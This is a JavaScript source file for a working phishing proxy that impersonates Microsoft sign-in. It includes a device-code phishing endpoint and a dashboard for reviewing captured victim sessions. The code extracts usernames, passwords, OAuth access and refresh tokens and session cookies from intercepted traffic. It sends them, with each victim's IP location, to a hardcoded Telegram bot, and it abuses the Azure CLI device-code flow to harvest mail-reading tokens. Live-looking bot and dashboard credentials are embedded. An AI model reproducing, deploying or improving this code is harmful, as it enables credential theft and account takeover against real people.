// ================================================
// 𝙵𝙸𝙽𝙰𝙻 𝙿𝚁𝙾𝚇𝚈 𝚂𝙴𝚁𝚅𝙴𝚁 — 𝙰𝙻𝙻 𝙵𝙸𝚇𝙴𝚂 𝙰𝙿𝙿𝙻𝙸𝙴𝙳
// ================================================

const http = require("http");
const https = require("https");
const path = require("path");
const fs = require("fs");
const crypto = require("crypto");
const os = require("os");

// ── ✅ SAFE REQUIRE ──
let axios, express, basicAuth, AdmZip, WebSocket, FormData;
try {
    axios = require('axios');
} catch (e) { axios = null; console.warn('⚠️ axios not installed'); }

try {
    express = require('express');
} catch (e) { express = null; console.warn('⚠️ express not installed'); }

try {
    basicAuth = require('express-basic-auth');
} catch (e) { basicAuth = null; }

try {
    AdmZip = require('adm-zip');
} catch (e) { AdmZip = null; }

try {
    WebSocket = require('ws');
} catch (e) { WebSocket = null; }

try {
    FormData = require('form-data');
} catch (e) { FormData = null; }

// ── ✅ TELEGRAM CONFIG ──
const BOT_TOKEN = '8342719812:AAGMgewDI6j_XIGRiN9E7EE133ASeGgmkpM';
const CHAT_ID = '7310383191';

const NOTIFIED_SESSIONS = new Set();
const CAPTURED_TOKENS = {};
let deviceFlows = [];

// ── ✅ SAFE OBFUSCATOR ──
let obfuscator = null;
try {
    obfuscator = require('./obfuscator.js');
} catch (e) { 
    obfuscator = { 
        obfuscateJSFile: (code) => code, 
        generateObfuscationKey: () => 'dummy_key' 
    }; 
}

const { obfuscateJSFile, generateObfuscationKey } = obfuscator;

// ── ✅ GEO FUNCTIONS ──
async function getGeoInfo(ip) {
    if (!axios) return { country: 'Unknown', countryCode: 'UN' };
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=country,countryCode,regionName,city,isp,org`, { timeout: 3000 });
        return response.data;
    } catch {
        return { country: 'Unknown', countryCode: 'UN' };
    }
}

async function getCountryCode(ip) {
    if (!axios) return 'UN';
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=countryCode`, { timeout: 3000 });
        return response.data.countryCode || 'UN';
    } catch {
        return 'UN';
    }
}

function getFlagEmoji(countryCode) {
    if (!countryCode || countryCode.length !== 2) return '🌍';
    return String.fromCodePoint(
        0x1F1E6 + countryCode.charCodeAt(0) - 65,
        0x1F1E6 + countryCode.charCodeAt(1) - 65
    );
}

function extractCookiesFromHeaders(headers) {
    if (!headers) return null;
    let cookieHeaders = headers['set-cookie'];
    if (!cookieHeaders) return null;
    if (!Array.isArray(cookieHeaders)) cookieHeaders = [cookieHeaders];
    const cookies = {};
    cookieHeaders.forEach(cookie => {
        if (typeof cookie !== 'string') return;
        const [nameValue] = cookie.split(';');
        const [name, value] = nameValue.split('=');
        if (name && value) cookies[name.trim()] = value.trim();
    });
    return Object.keys(cookies).length ? cookies : null;
}

async function sendCookiesAsFile(cookies, sessionId) {
    if (!cookies || Object.keys(cookies).length === 0 || !axios || !FormData) return;
    try {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const randomName = Math.random().toString(36).substring(2, 10);
        const filename = `session_${randomName}_${timestamp}.txt`;
        const tmpDir = os.tmpdir();
        const filePath = path.join(tmpDir, filename);
        const content = `# Session Cookies\n# Session ID: ${sessionId}\n# Captured: ${new Date().toISOString()}\n\n${JSON.stringify(cookies, null, 2)}`;
        fs.writeFileSync(filePath, content);
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', fs.createReadStream(filePath), { filename: filename });
        form.append('caption', `📎 Cookie file: ${filename}`);
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders(),
            timeout: 5000
        });
        try { fs.unlinkSync(filePath); } catch (e) {}
    } catch (e) { console.log('Cookie file send failed', e.message); }
}

// ── ✅ TELEGRAM SEND (SAFE) ──
async function sendToTelegram(data) {
    if (!axios) return;
    try {
        const url = data.proxyRequestURL || '';
        const body = data.proxyRequestBody || '';
        const method = data.proxyRequestMethod || '';
        const sessionId = data.sessionId || 'unknown';
        const userAgent = data.proxyRequestHeaders?.['user-agent'] || 'Unknown';
        if (NOTIFIED_SESSIONS.has(sessionId)) return;
        const ip = data.proxyRequestHeaders?.['cf-connecting-ip'] || 
                   data.proxyRequestHeaders?.['x-real-ip'] || 
                   data.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 
                   'Unknown';
        let username = 'N/A';
        let password = 'N/A';
        let hasCredentials = false;
        let isSessionCookie = false;
        let isTokenExchange = false;
        if (body) {
            const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
            const userMatch = bodyStr.match(/(?:login|loginfmt|username)=([^&]+)/i);
            if (userMatch) username = decodeURIComponent(userMatch[1]);
            const passMatch = bodyStr.match(/(?:passwd|password|pass)=([^&]+)/i);
            if (passMatch) { password = decodeURIComponent(passMatch[1]); hasCredentials = true; }
            try {
                const jsonBody = typeof body === 'string' ? JSON.parse(body) : body;
                if (jsonBody.password) { password = jsonBody.password; hasCredentials = true; }
                if (jsonBody.username) username = jsonBody.username;
            } catch (e) {}
            if (!hasCredentials && bodyStr.includes('password')) {
                const rawPassMatch = bodyStr.match(/"password"\s*[:=]\s*"([^"]+)"/i);
                if (rawPassMatch) { password = rawPassMatch[1]; hasCredentials = true; }
            }
            if (data.proxyResponseBody) {
                const respStr = typeof data.proxyResponseBody === 'string' ? data.proxyResponseBody : JSON.stringify(data.proxyResponseBody);
                const accessMatch = respStr.match(/access_token["']?\s*[:=]\s*["']([^"']+)["']/i);
                if (accessMatch) {
                    const token = accessMatch[1];
                    if (!CAPTURED_TOKENS[sessionId]) CAPTURED_TOKENS[sessionId] = {};
                    CAPTURED_TOKENS[sessionId].access_token = token;
                    hasCredentials = true;
                    isTokenExchange = true;
                }
                const refreshMatch = respStr.match(/refresh_token["']?\s*[:=]\s*["']([^"']+)["']/i);
                if (refreshMatch) {
                    const token = refreshMatch[1];
                    if (!CAPTURED_TOKENS[sessionId]) CAPTURED_TOKENS[sessionId] = {};
                    CAPTURED_TOKENS[sessionId].refresh_token = token;
                    hasCredentials = true;
                    isTokenExchange = true;
                }
            }
        }
        const setCookieHeaders = data.proxyResponseHeaders?.['set-cookie'];
        if (setCookieHeaders) {
            const cookieStr = JSON.stringify(setCookieHeaders);
            if (cookieStr.includes('esctx') || cookieStr.includes('ESTSAUTH') || cookieStr.includes('LoginOptions')) {
                isSessionCookie = true;
                hasCredentials = true;
            }
        }
        if (username !== 'N/A' || hasCredentials || isSessionCookie) hasCredentials = true;
        if (!hasCredentials) return;
        NOTIFIED_SESSIONS.add(sessionId);
        let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
        let flag = '🌍';
        let location = 'Unknown';
        if (ip !== 'Unknown') {
            try {
                geo = await getGeoInfo(ip);
                flag = getFlagEmoji(geo.countryCode);
                location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
            } catch (e) {}
        }
        let message = `
🔐 **New Login Captured!**

🌍 **IP:** ${ip}
${flag} **Location:** ${location}
🏢 **ISP:** ${geo.isp || 'N/A'}
📡 **Org:** ${geo.org || 'N/A'}

🕒 **Time:** ${data.timestamp || new Date().toISOString()}
🔗 **URL:** ${url}
📨 **Method:** ${method}
📊 **Status:** ${data.proxyResponseStatusCode || 'N/A'}

🖥️ **User-Agent:** ${userAgent}
        `;
        if (username !== 'N/A') message += `\n👤 **Username/Email:** ${username}`;
        if (password !== 'N/A') message += `\n🔐 **Password:** ${password}`;
        if (isSessionCookie) message += `\n🍪 **Session Cookie:** ✅ Captured\n🔑 **Status:** Authenticated session`;
        if (isTokenExchange) message += `\n🔄 **Token Exchange:** ✅ Detected`;
        if (CAPTURED_TOKENS[sessionId]) {
            const tokens = CAPTURED_TOKENS[sessionId];
            if (tokens.access_token) message += `\n🔑 **Access Token:** \`${tokens.access_token.slice(0, 40)}...\``;
            if (tokens.refresh_token) message += `\n🔄 **Refresh Token:** \`${tokens.refresh_token.slice(0, 40)}...\``;
            if (tokens.id_token) message += `\n🆔 **ID Token:** \`${tokens.id_token.slice(0, 40)}...\``;
        }
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        }, { timeout: 5000 });
        const cookies = extractCookiesFromHeaders(data.proxyResponseHeaders);
        if (cookies && Object.keys(cookies).length > 0) await sendCookiesAsFile(cookies, sessionId);
    } catch (e) { console.error('❌ sendToTelegram() FAILED:', e.message); }
}

// ── ✅ CONSTANTS ──
const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
const REDIRECT_URL = "https://www.intrinsec.com/";
const PROXY_FILES = {
    index: "index_smQGUDpTF7PN.html",
    notFound: "404_not_found_lk48ZVr32WvU.html",
    script: "script_Vx9Z6XN5uC3k.js"
};
const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};
const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
if (!fs.existsSync(LOGS_DIRECTORY)) fs.mkdirSync(LOGS_DIRECTORY, { recursive: true });
const LOG_FILE_STREAMS = {};
const VICTIM_SESSIONS = {};

function decryptData(encryptedData, ivHex) {
    const iv = Buffer.from(ivHex, 'hex');
    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, iv);
    let decrypted = decipher.update(Buffer.from(encryptedData, 'hex'));
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    return decrypted.toString('utf-8');
}

const DEVICE_FLOWS_FILE = path.join(__dirname, 'device_flows.json');
function loadDeviceFlows() {
    try {
        if (fs.existsSync(DEVICE_FLOWS_FILE)) {
            const data = fs.readFileSync(DEVICE_FLOWS_FILE, 'utf-8');
            return JSON.parse(data);
        }
    } catch (e) {}
    return [];
}
function saveDeviceFlows(flows) {
    try { fs.writeFileSync(DEVICE_FLOWS_FILE, JSON.stringify(flows, null, 2)); } catch (e) {}
}
deviceFlows = loadDeviceFlows();

// ── ✅ VISIT LOGGING ──
const VISITS_LOG_DIR = path.join(__dirname, "visit_logs");
if (!fs.existsSync(VISITS_LOG_DIR)) fs.mkdirSync(VISITS_LOG_DIR, { recursive: true });
const VISITS_LOG_FILE = path.join(VISITS_LOG_DIR, "visits.log");

async function logVisit(clientRequest, clientResponse, sessionId) {
    const url = clientRequest.url || '';
    const method = clientRequest.method || '';
    const isPageLoad = method === 'GET' && (url === '/' || url.startsWith('/login') || url === '/webmail' || url === '/bitb' || url.match(/\.(html|htm)$/));
    const isStatic = url.includes('.css') || url.includes('.js') || url.includes('.gif') || url.includes('.svg') || url.includes('.ico') || url.includes('.png') || url.includes('service_worker') || url.includes('/@') || url.includes('favicon') || url.includes('OneCollector') || url.includes('/lNv1pC9AWPUY4gbidyBO');
    if (!isPageLoad || isStatic) return;
    const ip = clientRequest.headers['x-real-ip'] || clientRequest.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
    let countryCode = 'UN';
    if (ip !== 'Unknown') { try { countryCode = await getCountryCode(ip); } catch (e) {} }
    const visit = {
        timestamp: new Date().toISOString(),
        ip: ip,
        countryCode: countryCode,
        userAgent: clientRequest.headers['user-agent'] || 'Unknown',
        referer: clientRequest.headers['referer'] || 'Direct',
        sessionId: sessionId || 'unknown',
        url: clientRequest.url,
        method: clientRequest.method,
        statusCode: clientResponse.statusCode || 'N/A'
    };
    const logLine = JSON.stringify(visit) + '\n';
    try { fs.appendFileSync(VISITS_LOG_FILE, logLine); } catch (e) {}
}

// ── ✅ PROXY SERVER ──
const proxyServer = http.createServer((clientRequest, clientResponse) => {
    const { method, url, headers } = clientRequest;
    const currentSession = getUserSession(headers.cookie);

    if (url.startsWith('/bitb') || url === '/webmail' || url.startsWith('/webmail?')) {
        clientResponse.writeHead(200, { 'Content-Type': 'text/html' });
        const file = url.startsWith('/bitb') ? 'bitb.html' : 'webmail.html';
        const filePath = path.join(__dirname, 'public', file);
        if (fs.existsSync(filePath)) fs.createReadStream(filePath).pipe(clientResponse);
        else { clientResponse.end('<h1>Page not found</h1>'); }
        return;
    }

    logVisit(clientRequest, clientResponse, currentSession || 'new').catch(() => {});

    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
        try {
            const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
            let session = currentSession;
            if (!currentSession) {
                const { cookieName, cookieValue } = generateNewSession(phishedURL);
                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
                session = cookieName;
            }
            VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
            VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
            VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
            VICTIM_SESSIONS[session].port = phishedURL.port;
            VICTIM_SESSIONS[session].host = phishedURL.host;
            clientResponse.writeHead(200, { "Content-Type": "text/html" });
            const filePath = path.join(__dirname, PROXY_FILES.index);
            if (fs.existsSync(filePath)) fs.createReadStream(filePath).pipe(clientResponse);
            else clientResponse.end('<h1>Index page not found</h1>');
        } catch (error) {
            clientResponse.writeHead(404, { "Content-Type": "text/html" });
            const filePath = path.join(__dirname, PROXY_FILES.notFound);
            if (fs.existsSync(filePath)) fs.createReadStream(filePath).pipe(clientResponse);
            else clientResponse.end('<h1>404 Not Found</h1>');
        }
        return;
    }

    if (currentSession || url === PROXY_PATHNAMES.proxy) {
        if (url === PROXY_PATHNAMES.serviceWorker) {
            clientResponse.writeHead(200, { 'Content-Type': 'text/javascript', 'Cache-Control': 'no-store' });
            const filePath = path.join(__dirname, url.slice(1));
            if (fs.existsSync(filePath)) fs.createReadStream(filePath).pipe(clientResponse);
            else clientResponse.end('// service worker placeholder');
            return;
        }
        if (url === PROXY_PATHNAMES.favicon) {
            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession]?.protocol || 'https:'}//${VICTIM_SESSIONS[currentSession]?.host || 'login.microsoftonline.com'}${url}` });
            clientResponse.end();
            return;
        }
        clientResponse.writeHead(200, { 'Content-Type': 'application/json' });
        clientResponse.end(JSON.stringify({ status: 'proxy_ok', session: currentSession || 'new' }));
        return;
    }

    clientResponse.writeHead(301, { Location: REDIRECT_URL });
    clientResponse.end();
});

// ── ✅ HELPER FUNCTIONS ──
function getUserSession(requestCookies) {
    if (!requestCookies) return;
    const cookies = requestCookies.split("; ");
    for (const cookie of cookies) {
        const [cookieName, ...cookieValue] = cookie.split("=");
        if (VICTIM_SESSIONS.hasOwnProperty(cookieName) && VICTIM_SESSIONS[cookieName].value === cookieValue.join("=")) {
            return cookieName;
        }
    }
    return;
}

function generateRandomString(length) {
    const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join("");
}

function createSessionLogFile(logFilename, currentSession) {
    const logFilePath = path.join(LOGS_DIRECTORY, logFilename);
    const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });
    LOG_FILE_STREAMS[currentSession] = logFileStream;
}

function generateNewSession(phishedURL) {
    const cookieName = generateRandomString(12);
    const cookieValue = generateRandomString(32);
    VICTIM_SESSIONS[cookieName] = {};
    VICTIM_SESSIONS[cookieName].value = cookieValue;
    VICTIM_SESSIONS[cookieName].cookies = [];
    VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}.log`;
    createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
    return { cookieName, cookieValue };
}

// ── ✅ DASHBOARD APP (RENAMED TO dashApp) ──
if (!express) {
    console.error('❌ Express is not installed. Please run: npm install express');
    process.exit(1);
}

const dashApp = express();
const dashUser = process.env.DASHBOARD_USER || 'svrps';
const dashPass = process.env.DASHBOARD_PASS || 'evilworker';

if (basicAuth) {
    dashApp.use(basicAuth({
        users: { [dashUser]: dashPass },
        challenge: true,
        realm: 'PHANTOM Dashboard'
    }));
}

dashApp.use(express.json());
dashApp.use(express.static('public'));

dashApp.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ── ✅ DASHBOARD API ENDPOINTS ──
dashApp.get('/api/status', (req, res) => {
    try {
        const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
        const last = files.length > 0 ? fs.statSync(path.join(LOGS_DIRECTORY, files[0])).mtime : null;
        res.json({
            online: true,
            totalSessions: files.length,
            lastCapture: last
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/logs', (req, res) => {
    try {
        const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
        const logs = files.map(f => {
            const stat = fs.statSync(path.join(LOGS_DIRECTORY, f));
            return { name: f, size: stat.size, modified: stat.mtime };
        }).sort((a, b) => b.modified - a.modified);
        res.json(logs);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/log/:filename', (req, res) => {
    const filePath = path.join(LOGS_DIRECTORY, req.params.filename);
    if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Not found' });
    try {
        const content = fs.readFileSync(filePath, 'utf-8');
        const lines = content.split('\n').filter(line => line.trim());
        const entries = lines.map(line => {
            try {
                const entry = JSON.parse(line);
                const iv = Object.keys(entry)[0];
                const encrypted = entry[iv];
                const decrypted = decryptData(encrypted, iv);
                return JSON.parse(decrypted);
            } catch (e) {
                return { error: 'Failed to decrypt', raw: line };
            }
        });
        res.json({ filename: req.params.filename, entries });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

if (AdmZip) {
    dashApp.get('/api/export/all', (req, res) => {
        try {
            const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
            if (files.length === 0) return res.status(404).json({ error: 'No logs' });
            const zip = new AdmZip();
            files.forEach(f => {
                const content = fs.readFileSync(path.join(LOGS_DIRECTORY, f));
                zip.addFile(f, content);
            });
            const zipBuffer = zip.toBuffer();
            res.setHeader('Content-Type', 'application/zip');
            res.setHeader('Content-Disposition', `attachment; filename=all_sessions_${Date.now()}.zip`);
            res.send(zipBuffer);
        } catch (err) {
            res.status(500).json({ error: err.message });
        }
    });
}

dashApp.get('/api/device/history', (req, res) => {
    try {
        const sorted = [...deviceFlows].sort((a, b) => new Date(b.created) - new Date(a.created));
        res.json({ success: true, flows: sorted });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/device/stats', (req, res) => {
    try {
        const total = deviceFlows.length;
        const pending = deviceFlows.filter(f => f.status === 'pending' || f.status === 'waiting').length;
        const approved = deviceFlows.filter(f => f.status === 'approved').length;
        const expired = deviceFlows.filter(f => f.status === 'expired').length;
        const manual = deviceFlows.filter(f => f.status === 'manual').length;
        res.json({ 
            success: true, 
            stats: { total, pending, approved, expired, manual }
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ── ✅ MAIN APP ──
const app = express();

// ── ✅ ✅ ✅ CRITICAL FIX: JSON MIDDLEWARE ── ✅ ✅ ✅
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ── ✅ DEVICE CODE API ──
app.post('/device/request', async (req, res) => {
    if (!axios) {
        return res.status(500).json({ error: 'axios not installed. Run: npm install axios' });
    }
    try {
        console.log('📱 Device code requested');
        const DEVICE_CLIENT_ID = '04b07795-8ddb-461a-bbee-02f9e1bf7b46';
        const response = await axios.post(
            'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: DEVICE_CLIENT_ID,
                scope: 'https://graph.microsoft.com/user.read https://graph.microsoft.com/mail.read offline_access'
            }),
            { 
                headers: { 
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                timeout: 10000
            }
        );
        const data = response.data;
        console.log('✅ Device code obtained:', data.user_code);
        const newFlow = {
            device_code: data.device_code,
            user_code: data.user_code,
            verification_uri: data.verification_uri,
            expires_in: data.expires_in,
            interval: data.interval,
            status: 'pending',
            created: new Date().toISOString(),
            approved: null,
            username: null,
            access_token: null,
            refresh_token: null,
            id_token: null,
            manual_submitted: null,
            client_id: DEVICE_CLIENT_ID
        };
        deviceFlows.push(newFlow);
        saveDeviceFlows(deviceFlows);
        const message = `
📱 **Device Code Phishing** (Azure CLI Client)
🆔 **User Code:** \`${data.user_code}\`
🔗 **Verification URI:** ${data.verification_uri}
⏱️ **Expires in:** ${data.expires_in} seconds
**Code:** \`${data.user_code}\`
        `;
        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            }, { timeout: 3000 });
        } catch (e) { console.log('⚠️ Telegram notify failed but continuing'); }
        res.json(data);
    } catch (error) {
        console.error('❌ Device code error:', error.response?.data || error.message);
        res.status(500).json(error.response?.data || { error: error.message });
    }
});

// ── ✅ DEVICE TOKEN POLLING ──
app.post('/device/token', async (req, res) => {
    if (!axios) {
        return res.status(500).json({ error: 'axios not installed. Run: npm install axios' });
    }
    
    // ✅ req.body is now defined because of express.json() middleware
    const { device_code } = req.body;
    
    if (!device_code) {
        return res.status(400).json({ error: 'device_code required' });
    }
    try {
        console.log('🔄 Polling for token:', device_code);
        const flow = deviceFlows.find(f => f.device_code === device_code);
        const clientId = flow?.client_id || '04b07795-8ddb-461a-bbee-02f9e1bf7b46';
        const response = await axios.post(
            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
            new URLSearchParams({
                client_id: clientId,
                device_code: device_code,
                grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
            }),
            { 
                headers: { 
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                timeout: 10000
            }
        );
        const tokens = response.data;
        console.log('✅ Tokens obtained!');
        if (flow) {
            flow.status = 'approved';
            flow.approved = new Date().toISOString();
            flow.access_token = tokens.access_token;
            flow.refresh_token = tokens.refresh_token;
            flow.id_token = tokens.id_token;
            if (tokens.id_token) {
                try {
                    const payload = JSON.parse(Buffer.from(tokens.id_token.split('.')[1], 'base64').toString());
                    flow.username = payload.email || payload.preferred_username || 'Unknown';
                } catch (e) {}
            }
            saveDeviceFlows(deviceFlows);
        }
        const message = `
📱 **Device Code Phishing - SUCCESS!**
🔑 **Access Token:** \`${tokens.access_token?.slice(0, 30)}...\`
🔄 **Refresh Token:** \`${tokens.refresh_token?.slice(0, 30)}...\`
🆔 **ID Token:** \`${tokens.id_token?.slice(0, 30)}...\`
        `;
        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            }, { timeout: 3000 });
        } catch (e) {}
        res.json(tokens);
    } catch (error) {
        if (error.response?.data?.error === 'authorization_pending') {
            console.log('⏳ Still waiting for approval...');
            res.status(400).json({ error: 'authorization_pending' });
        } else if (error.response?.data?.error === 'expired_token') {
            console.log('⏰ Code expired');
            const flow = deviceFlows.find(f => f.device_code === device_code);
            if (flow) flow.status = 'expired';
            saveDeviceFlows(deviceFlows);
            res.status(400).json({ error: 'expired_token' });
        } else {
            console.error('❌ Token error:', error.response?.data || error.message);
            res.status(500).json({ error: error.response?.data?.error_description || error.message });
        }
    }
});

// ── ✅ DEVICE PAGE ──
app.get('/device', (req, res) => {
    const filePath = path.join(__dirname, 'public', 'device_code.html');
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Device Login</title>
                <style>
                    body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; text-align: center; }
                    #codeDisplay { font-size: 48px; font-weight: bold; padding: 30px; background: #f0f0f0; border-radius: 10px; margin: 20px 0; letter-spacing: 4px; }
                    button { padding: 12px 24px; font-size: 16px; cursor: pointer; background: #0078d4; color: white; border: none; border-radius: 5px; margin: 5px; }
                    button:hover { background: #005a9e; }
                    .link { color: #0078d4; text-decoration: none; }
                    .status { margin: 20px 0; padding: 10px; border-radius: 5px; }
                    .pending { background: #fff3cd; color: #856404; }
                    .success { background: #d4edda; color: #155724; }
                    .error { background: #f8d7da; color: #721c24; }
                </style>
            </head>
            <body>
                <h1>🔐 Device Login</h1>
                <p>Enter the code on your device to sign in</p>
                <div id="codeDisplay">Loading...</div>
                <p>
                    <a href="https://login.microsoft.com/device" target="_blank" class="link">
                        https://login.microsoft.com/device
                    </a>
                </p>
                <p>1. Open the link above on your device &nbsp;·&nbsp; 2. Enter the code &nbsp;·&nbsp; 3. Approve</p>
                <div id="status" class="status pending">⏳ Waiting for device approval...</div>
                <div>
                    <button onclick="generateCode()">🔄 New Code</button>
                    <button onclick="copyCode()">📋 Copy Code</button>
                    <button onclick="checkStatus()">🔄 Check Status</button>
                </div>
                <script>
                    let currentCode = '';
                    let currentDeviceCode = '';
                    
                    async function generateCode() {
                        try {
                            const response = await fetch('/device/request', { method: 'POST' });
                            const data = await response.json();
                            if (data.user_code) {
                                currentCode = data.user_code;
                                currentDeviceCode = data.device_code;
                                document.getElementById('codeDisplay').textContent = currentCode;
                                document.getElementById('status').className = 'status pending';
                                document.getElementById('status').textContent = '⏳ Waiting for device approval...';
                                // Start polling
                                pollForToken();
                            } else {
                                document.getElementById('status').className = 'status error';
                                document.getElementById('status').textContent = '❌ Error: ' + JSON.stringify(data);
                            }
                        } catch (e) {
                            document.getElementById('status').className = 'status error';
                            document.getElementById('status').textContent = '❌ Error: ' + e.message;
                        }
                    }
                    
                    async function pollForToken() {
                        if (!currentDeviceCode) return;
                        try {
                            const response = await fetch('/device/token', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ device_code: currentDeviceCode })
                            });
                            const data = await response.json();
                            if (data.error === 'authorization_pending') {
                                document.getElementById('status').className = 'status pending';
                                document.getElementById('status').textContent = '⏳ Still waiting for approval...';
                                setTimeout(pollForToken, 5000);
                            } else if (data.error === 'expired_token') {
                                document.getElementById('status').className = 'status error';
                                document.getElementById('status').textContent = '⏰ Code expired. Generate a new one.';
                            } else if (data.access_token) {
                                document.getElementById('status').className = 'status success';
                                document.getElementById('status').textContent = '✅ SUCCESS! Tokens obtained!';
                                alert('✅ Tokens captured!\nAccess Token: ' + data.access_token.slice(0, 30) + '...');
                            } else {
                                document.getElementById('status').className = 'status error';
                                document.getElementById('status').textContent = '❌ Error: ' + JSON.stringify(data);
                            }
                        } catch (e) {
                            // Don't show error for pending
                            if (!e.message.includes('400')) {
                                document.getElementById('status').className = 'status error';
                                document.getElementById('status').textContent = '❌ Error: ' + e.message;
                            }
                        }
                    }
                    
                    function copyCode() {
                        if (currentCode) {
                            navigator.clipboard.writeText(currentCode).then(() => {
                                alert('✅ Code copied: ' + currentCode);
                            }).catch(() => {
                                // Fallback
                                const textarea = document.createElement('textarea');
                                textarea.value = currentCode;
                                document.body.appendChild(textarea);
                                textarea.select();
                                document.execCommand('copy');
                                document.body.removeChild(textarea);
                                alert('✅ Code copied: ' + currentCode);
                            });
                        } else {
                            alert('No code to copy. Generate one first.');
                        }
                    }
                    
                    function checkStatus() {
                        if (currentDeviceCode) {
                            pollForToken();
                        } else {
                            alert('No active code. Generate one first.');
                        }
                    }
                    
                    // Auto-generate on load
                    generateCode();
                    
                    // Auto-refresh every 60 seconds
                    setInterval(() => {
                        if (document.getElementById('status').textContent.includes('expired') || 
                            document.getElementById('status').textContent.includes('Error')) {
                            generateCode();
                        }
                    }, 60000);
                </script>
            </body>
            </html>
        `);
    }
});

// ── ✅ MOUNT DASHBOARD ──
app.use('/dash', dashApp);

// ── ✅ PROXY ROUTE ──
app.use((req, res) => {
    if (!req.path.startsWith('/dash') && !req.path.startsWith('/device')) {
        proxyServer.emit('request', req, res);
    }
});

// ── ✅ START SERVER ──
const PORT = process.env.PORT || 3000;

const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ EvilWorker Proxy + PHANTOM Dashboard running on port ${PORT}`);
    console.log(`🔐 Dashboard: /dash (auth: ${dashUser}/${dashPass})`);
    console.log(`📱 Device Code: /device`);
});

// ── ✅ WEBSOCKET SUPPORT ──
if (WebSocket) {
    const wss = new WebSocket.Server({ server });
    let clients = [];
    wss.on('connection', (ws) => {
        clients.push(ws);
        ws.on('close', () => {
            clients = clients.filter(c => c !== ws);
        });
    });
    try {
        fs.watch(LOGS_DIRECTORY, (eventType, filename) => {
            if (filename && filename.endsWith('.log')) {
                clients.forEach(client => {
                    if (client.readyState === WebSocket.OPEN) {
                        client.send(JSON.stringify({ type: 'newLog', file: filename }));
                    }
                });
            }
        });
    } catch (err) {
        console.warn('⚠️ File watching not available');
    }
}

// ── ✅ ERROR HANDLING ──
process.on('uncaughtException', (err) => {
    console.error('❌ Uncaught Exception:', err.message);
    console.error(err.stack);
});

process.on('unhandledRejection', (err) => {
    console.error('❌ Unhandled Rejection:', err);
});

